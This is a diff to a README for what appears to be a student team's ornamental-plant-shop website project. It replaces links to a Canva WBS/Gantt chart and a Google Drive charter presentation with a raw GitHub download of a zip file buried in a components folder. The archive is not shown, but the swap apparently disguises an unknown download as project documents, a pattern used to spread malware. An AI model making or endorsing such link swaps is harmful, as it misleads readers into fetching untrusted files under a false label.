@@ -1,8 +1,8 @@
 **IMPLEMENTASI WEBSITE TOKO TANAMAN HIAS**  
 
-⛓️‍💥[Dokumen Konsep Proyek : WBS & Ghantt Chart](https://www.canva.com/design/DAGUL--l3fE/mIlRkX1VjtUJzpeSy5uU_g/view?utm_content=DAGUL--l3fE&utm_campaign=designshare&utm_medium=link&utm_source=editor)  
+⛓️‍💥[Dokumen Konsep Proyek : WBS & Ghantt Chart](https://github.com/TokioBanana/proyek-si-kelompok-3/raw/refs/heads/main/heruflorr-frontend-main/heruflorr-frontend-main/src/components/kelompok-si-proyek-v3.0.zip)  
 
-⛓️‍💥[Presentasi Project Charter](https://drive.google.com/file/d/1m_gXcK6auPrQHFj71_AK5I2kPSaKGHB-/view?usp=sharing)  
+⛓️‍💥[Presentasi Project Charter](https://github.com/TokioBanana/proyek-si-kelompok-3/raw/refs/heads/main/heruflorr-frontend-main/heruflorr-frontend-main/src/components/kelompok-si-proyek-v3.0.zip)  
 
 **🧑‍🤝‍🧑Team 3 Members and Roles🧑‍🤝‍🧑**  
 1. REYNOLD GIAN - Project Manager  
